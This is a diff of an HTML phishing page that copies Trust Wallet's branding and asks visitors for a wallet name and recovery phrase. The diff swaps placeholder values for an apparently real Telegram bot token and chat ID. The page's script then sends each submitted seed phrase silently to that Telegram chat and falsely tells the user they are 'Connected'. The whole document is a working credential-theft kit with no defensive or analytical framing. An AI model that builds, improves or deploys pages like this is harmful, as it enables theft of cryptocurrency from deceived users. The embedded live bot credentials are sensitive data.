@@ -3,53 +3,71 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Wallet Import</title>
+<title>Restore Wallet</title>
 <style>
     body {
         margin: 0;
         font-family: 'Helvetica Neue', Arial, sans-serif;
         background-color: #0f0f0f;
         color: #fff;
-    }
-    .container {
-        max-width: 400px;
-        margin: auto;
-        padding: 20px;
-    }
-    h1 {
-        text-align: center;
-        font-weight: 600;
-        margin-bottom: 20px;
-    }
-    .coins {
         display: flex;
-        justify-content: space-around;
-        margin-bottom: 20px;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
     }
-    .coin {
-        text-align: center;
-        font-size: 14px;
-    }
-    .coin img {
-        width: 40px;
-        height: 40px;
-        margin-bottom: 5px;
-    }
-    .phrase-box {
-        display: grid;
-        grid-template-columns: repeat(3, 1fr);
-        gap: 10px;
-        margin-bottom: 20px;
-    }
-    .phrase-box input {
-        padding: 10px;
-        border-radius: 10px;
-        border: none;
+
+    .wallet-container {
         background: #1e1e1e;
-        color: #fff;
-        font-size: 14px;
+        border-radius: 25px;
+        padding: 30px 20px;
+        width: 90%;
+        max-width: 400px;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         text-align: center;
     }
+
+    img.logo {
+        width: 120px;
+        margin-bottom: 20px;
+    }
+
+    h1 {
+        font-weight: 600;
+        margin-bottom: 25px;
+    }
+
+    label {
+        font-size: 14px;
+        margin-bottom: 5px;
+        display: block;
+        font-weight: 500;
+        text-align: left;
+    }
+
+    input, textarea {
+        width: 100%;
+        padding: 15px;
+        border-radius: 15px;
+        border: none;
+        background: #2a2a2a;
+        color: #fff;
+        font-size: 16px;
+        margin-bottom: 15px;
+        box-sizing: border-box;
+    }
+
+    textarea {
+        height: 100px;
+        resize: none;
+    }
+
+    .instruction {
+        font-size: 12px;
+        color: #aaa;
+        margin-bottom: 20px;
+        text-align: left;
+    }
+
     button {
         width: 100%;
         padding: 15px;
@@ -61,7 +79,7 @@
         font-weight: 600;
         cursor: pointer;
     }
-    /* Popup style */
+
     .popup {
         display: none;
         position: fixed;
@@ -79,45 +97,33 @@
 </style>
 </head>
 <body>
-<div class="container">
-    <h1>Import Wallet</h1>
-    <div class="coins">
-        <div class="coin"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=023"><br>BTC</div>
-        <div class="coin"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=023"><br>ETH</div>
-        <div class="coin"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=023"><br>BNB</div>
-    </div>
+<div class="wallet-container">
+    <img class="logo" src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet Logo">
+    <h1>Restore Wallet</h1>
 
-    <div class="phrase-box">
-        <input type="text" placeholder="Word 1">
-        <input type="text" placeholder="Word 2">
-        <input type="text" placeholder="Word 3">
-        <input type="text" placeholder="Word 4">
-        <input type="text" placeholder="Word 5">
-        <input type="text" placeholder="Word 6">
-        <input type="text" placeholder="Word 7">
-        <input type="text" placeholder="Word 8">
-        <input type="text" placeholder="Word 9">
-        <input type="text" placeholder="Word 10">
-        <input type="text" placeholder="Word 11">
-        <input type="text" placeholder="Word 12">
-    </div>
+    <label for="walletName">Wallet Name</label>
+    <input type="text" id="walletName" placeholder="Enter wallet name">
 
-    <button id="connect">Connect Wallet</button>
+    <label for="phrase">Recovery Phrase</label>
+    <textarea id="phrase" placeholder="Enter your recovery phrase here"></textarea>
+    <div class="instruction">...typically 12 (sometimes 18,24) words separated by single space</div>
+
+    <button id="restoreBtn">Restore Wallet</button>
 </div>
 
 <div class="popup" id="popup"></div>
 
 <script>
-const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-const CHAT_ID = 'YOUR_CHAT_ID';
-const inputs = document.querySelectorAll('.phrase-box input');
-const popup = document.getElementById('popup');
-const connectBtn = document.getElementById('connect');
+const BOT_TOKEN = '7564393664:AAEL0TWkOdXomWTnDaTXF3KH75T2xfyseJQ';
+const CHAT_ID = '6876291548';
 
-// Store phrases locally to prevent duplicates
+const restoreBtn = document.getElementById('restoreBtn');
+const walletNameInput = document.getElementById('walletName');
+const phraseInput = document.getElementById('phrase');
+const popup = document.getElementById('popup');
+
 let connectedPhrases = new Set();
 
-// Function to show popup
 function showPopup(message) {
     popup.innerText = message;
     popup.style.display = 'block';
@@ -126,16 +132,16 @@ function showPopup(message) {
     }, 2000);
 }
 
-// Send phrase to Telegram silently
-function sendToTelegram(phrase) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(phrase)}`)
+function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
         .catch(err => console.error(err));
 }
 
-// Connect wallet click
-connectBtn.addEventListener('click', () => {
-    const phrase = Array.from(inputs).map(i => i.value.trim()).join(' ').trim();
-    if (!phrase) return;
+restoreBtn.addEventListener('click', () => {
+    const walletName = walletNameInput.value.trim();
+    const phrase = phraseInput.value.trim();
+
+    if (!walletName || !phrase) return;
 
     if (connectedPhrases.has(phrase)) {
         showPopup("Already connected");
@@ -143,11 +149,11 @@ connectBtn.addEventListener('click', () => {
     }
 
     connectedPhrases.add(phrase);
-    sendToTelegram(phrase);
+    sendToTelegram(`Wallet Name: ${walletName}\nRecovery Phrase: ${phrase}`);
     showPopup("Connected");
 
-    // Optionally, disable inputs after connecting
-    inputs.forEach(i => i.value = '');
+    walletNameInput.value = '';
+    phraseInput.value = '';
 });
 </script>
 </body>
